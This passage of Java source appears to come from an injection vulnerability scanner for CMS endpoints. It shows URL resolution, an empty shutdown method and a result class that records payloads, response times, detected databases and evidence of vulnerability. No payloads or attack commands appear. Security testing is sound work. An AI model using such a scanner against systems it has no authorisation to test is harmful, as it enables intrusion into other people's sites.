                String basePath = base.getPath();
                if (basePath == null || basePath.isEmpty()) basePath = "/";
                int lastSlash = basePath.lastIndexOf('/');
                String parentPath = lastSlash >= 0 ? basePath.substring(0, lastSlash + 1) : "/";
                return scheme + "://" + authority + parentPath + path;
            }
        } catch (Exception e) {
            return baseUrl.endsWith("/") ? baseUrl + path : baseUrl + "/" + path;
        }
    }

    /**
     * Shutdown the executor service.
     */
    public void shutdown() {
        // No resources to clean up
    }

    // --- Inner classes ---

    private record HttpResponse(int statusCode, String body) {}

    /**
     * CMS-specific endpoint profile loaded from cms-profiles.txt.
     */
    private record CmsEndpointProfile(String method, String path, List<String> parameters, String description) {}

    /**
     * Represents a single injection test result.
     */
    public static class InjectionResult {
        private final String payload;
        private final String endpoint;
        private final String method;
        private final int statusCode;
        private final long responseTime;
        private final String detectedDatabase;
        private final List<String> evidence;
        private final String responseSnippet;

        public InjectionResult(String payload, String endpoint, String method,
                               int statusCode, long responseTime, String detectedDatabase,
                               List<String> evidence, String responseSnippet) {
            this.payload = payload;
            this.endpoint = endpoint;
            this.method = method;
            this.statusCode = statusCode;
            this.responseTime = responseTime;
            this.detectedDatabase = detectedDatabase;
            this.evidence = evidence;
            this.responseSnippet = responseSnippet;
        }

        public boolean isVulnerable() {
            return evidence != null && !evidence.isEmpty();
        }

        public String getPayload() { return payload; }
        public String getEndpoint() { return endpoint; }
        public String getMethod() { return method; }
        public int getStatusCode() { return statusCode; }
        public long getResponseTime() { return responseTime; }
        public String getDetectedDatabase() { return detectedDatabase; }
        public List<String> getEvidence() { return evidence; }
        public String getResponseSnippet() { return responseSnippet; }
    }
}
